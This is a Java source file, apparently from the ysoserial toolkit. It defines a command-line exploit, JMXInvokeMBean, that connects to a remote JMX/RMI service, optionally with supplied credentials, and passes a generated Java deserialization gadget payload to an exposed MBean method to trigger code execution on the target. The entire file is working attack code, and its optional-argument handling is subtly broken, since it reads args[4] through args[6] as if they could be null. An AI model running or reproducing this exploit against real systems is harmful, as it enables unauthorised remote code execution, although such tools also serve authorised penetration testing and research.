package ysoserial.exploit;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

import ysoserial.payloads.ObjectPayload.Utils;

/*
 * Utility program for exploiting RMI based JMX services running with required gadgets available in their ClassLoader.
 * Attempts to exploit the service by invoking a method on a exposed MBean, passing the payload as argument.
 * 
 */
public class JMXInvokeMBean {

	public static void main(String[] args) throws Exception {
	
		if ( args.length < 4 ) {
			System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <payload_type> <payload_arg>");
			System.exit(-1);
		}

        final String host = args[0];
        final String port = args[1];
        final String payload_type = args[2];
        final String payload_arg = args[3];


        final String mbean = (args[4] == null) ? "java.util.logging:type=Logging" : args[4];
        final String role = (args[5] == null) ? "" : args[5];
        final String pass = (args[6] == null) ? "" : args[6];


        JMXServiceURL url = new JMXServiceURL(String.format("service:jmx:rmi:///jndi/rmi://%s:%s/jmxrmi", host, port));

        JMXConnector jmxConnector;

        if (role.isEmpty()) {
            jmxConnector = JMXConnectorFactory.connect(url);
        } else {
            jmxConnector = JMXConnectorFactory.connect(url, java.util.Collections.singletonMap(JMXConnector.CREDENTIALS, new String[]{role, pass}));
        }

		MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

        // create the payload
        Object payloadObject = Utils.makePayloadObject(payload_type, payload_arg);
        ObjectName mbeanName = new ObjectName(mbean);

		mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

		//close the connection
		jmxConnector.close();
    }
}